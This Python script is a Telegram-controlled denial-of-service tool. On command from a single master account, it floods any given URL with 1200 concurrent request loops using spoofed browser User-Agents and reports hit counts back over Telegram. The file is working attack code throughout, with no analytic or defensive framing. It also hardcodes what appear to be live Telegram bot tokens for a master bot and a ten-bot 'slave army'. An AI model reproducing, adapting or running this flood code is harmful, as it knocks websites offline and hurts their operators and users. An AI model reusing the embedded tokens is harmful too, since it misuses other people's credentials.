import asyncio
import aiohttp
import random
from aiohttp import web

MASTER_TOKEN = "8536346083:AAGYUDR6cd7hI9_41_gNbQdREbBb6Dn_9v4"
SLAVE_ARMY = {
    "S1": "8064983761:AAGEZRc9LASS7Fkifm3C3ebOdykCTTJUZ_0", "S2": "8460123410:AAE61k-8wPWE4hkmOxge802d8k7CTrhcfCE",
    "S3": "8529444938:AAHd0VxfMeMlA3XSu9NH5RiBcUvRW09atgE", "S4": "8500850898:AAEje_m--Tt7eOYjKWwpxXC_BYl2NhiqgVc",
    "S5": "8497321044:AAGGQ2eng3ZgtjOECMRyHO_OJjvSuLTH9RI", "S6": "8201736485:AAGFSv-af1506M9pipoaFbHKQW2vLloIMFk",
    "S7": "8420555273:AAHD4mJVw1wY0_nQVSenIBNEaAomcH98sXo", "S8": "8524480261:AAGCe54hX-9PjDsVQW5whE36kj5IBNmKRKA",
    "S9": "8579851332:AAGSd7Mtze2XfBlFoQWcIL5JrzBiz47qXAI", "S10": "8525114674:AAE7LnGxkqaaL6M0DH25NiU3WYHygWYlON4"
}
MASTER_ID = 1938591484

class AIP2K_Identity_Engine:
    def __init__(self):
        self.session = None
        self.target = ""
        self.success = 0
        self.failed = 0
        self.is_active = False
        self.bot_identities = {} # স্টোরিং ইউজারনেম

    async def _fetch_identities(self):
        for key, token in SLAVE_ARMY.items():
            try:
                async with self.session.get(f"https://api.telegram.org/bot{token}/getMe") as r:
                    data = await r.json()
                    if data.get('ok'):
                        self.bot_identities[key] = f"@{data['result']['username']}"
                    else:
                        self.bot_identities[key] = f"Unknown_{key}"
            except:
                self.bot_identities[key] = f"Offline_{key}"

    async def _notify(self, text):
        print(f"[RENDER-LOG] {text}")
        url = f"https://api.telegram.org/bot{MASTER_TOKEN}/sendMessage"
        try:
            async with self.session.post(url, json={'chat_id': MASTER_ID, 'text': text}) as r: pass
        except: pass

    async def _strike(self):
        while self.is_active and self.target:
            h = {'User-Agent': f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/{random.randint(118,124)}.0.0.0"}
            try:
                async with self.session.get(self.target, headers=h, timeout=10) as r:
                    if r.status == 200: self.success += 1
                    else: self.failed += 1
            except: self.failed += 1
            
            if (self.success + self.failed) % 1000 == 0:
                report = f"📊 AIP2K LIVE REPORT\n✅ SUCCESS: {self.success}\n❌ FAILED: {self.failed}\n"
                report += "--------------------\n"
                for key, identity in self.bot_identities.items():
                    report += f"🤖 {identity}: ACTIVE\n"
                asyncio.create_task(self._notify(report))
            await asyncio.sleep(0.000001)

    async def handle_updates(self):
        offset = 0
        await self._fetch_identities()
        await self._notify("🔱 AIP2K IDENTITY ENGINE ONLINE\nবট ইউজারনেম সিঙ্ক্রোনাইজ করা হয়েছে।")
        while True:
            try:
                url = f"https://api.telegram.org/bot{MASTER_TOKEN}/getUpdates?offset={offset}"
                async with self.session.get(url) as r:
                    data = await r.json()
                    for update in data.get('result', []):
                        offset = update['update_id'] + 1
                        msg = update.get('message', {})
                        text = msg.get('text', '')
                        if msg.get('from', {}).get('id') != MASTER_ID: continue
                        
                        if text.startswith("http"):
                            self.target = text
                            self.is_active = True
                            self.success = 0
                            self.failed = 0
                            await self._notify(f"⚔️ ATTACK STARTED ON: {text}")
                            for _ in range(1200): asyncio.create_task(self._strike())
                        
                        elif text == "/check":
                            audit = "🔎 LIVE TOKEN & IDENTITY AUDIT:\n"
                            for key, token in SLAVE_ARMY.items():
                                async with self.session.get(f"https://api.telegram.org/bot{token}/getMe") as res:
                                    d = await res.json()
                                    if d.get('ok'):
                                        audit += f"✅ @{d['result']['username']} (Online)\n"
                                    else:
                                        audit += f"❌ {key}: Token Dead\n"
                            await self._notify(audit)
                            
                        elif text == "/stop":
                            self.is_active = False
                            await self._notify(f"🛑 STOPPED. FINAL HITS: {self.success}")
            except: await asyncio.sleep(1)

async def main():
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0)) as sess:
        bot = AIP2K_Identity_Engine(); bot.session = sess
        app = web.Application(); runner = web.AppRunner(app)
        await runner.setup(); await web.TCPSite(runner, '0.0.0.0', 10000).start()
        await bot.handle_updates()

if __name__ == "__main__":
    asyncio.run(main())
    
